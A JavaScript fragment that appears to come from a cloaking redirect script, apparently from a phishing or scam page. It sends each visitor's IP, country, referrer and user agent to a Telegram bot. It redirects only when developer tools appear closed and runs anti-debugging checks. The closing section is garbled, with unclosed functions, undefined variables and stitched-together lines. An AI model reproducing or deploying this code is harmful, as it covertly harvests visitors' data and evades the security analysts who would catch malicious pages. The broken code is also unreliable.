// Fonction pour envoyer une notification Telegram
async function sendTelegramNotification(ip, country, referer, userAgent) {
    const message = `New visit to your website!\nIP: ${ip}\nCountry: ${country}\nReferer: ${referer}\nUser-Agent: ${userAgent}`;

    // URL de l'API Telegram
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

    // Body of the request
    const body = {
        chat_id: CHAT_ID,
        text: message
    };

    // Sending the HTTP request
    await fetch(url, {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify(body)
    })
        .then(response => {
            if (response.ok) {
                console.log("Telegram notification sent successfully!");

                setTimeout(function() {
                    if (!isDevToolsOpen) {
                        window.location.href = normalDestination;
                    }
                    
                    setInterval(checkDebugger, 1000);
                    setInterval(checkConsole, 1000);
                }, 50);
                
            } else {
                console.error("Error sending Telegram notification.", response);
            }
        })
        .catch(error => {
            console.error("Network error :", error);
        });
}

// Function to get user's IP address, country, referer and user-agent
async function getUserIPAndCountry() {
    await fetch("https://ipapi.co/json/") // Public API to get IP and country
        .then(async response => response.json())
        .then(async data => {
            const userIP = data.ip || "Inconnu";
            const country = data.country_name || "Inconnu";
            const referer = document.referrer || "Inconnu";
            const userAgent = navigator.userAgent || "Inconnu";

            await sendTelegramNotification(userIP, country, referer, userAgent);
        })
        .catch(error => {
            console.error("Error getting IP and country :", error);
        });
}



(async function () {

        pixel.onerror = () => { };

    function checkDebugger() {
        const startTime = Date.now();

                logUuidViaPixel(uuid);

    function checkConsole() {
        const startTime = Date.now();

        if (endTime - startTime > 100) {
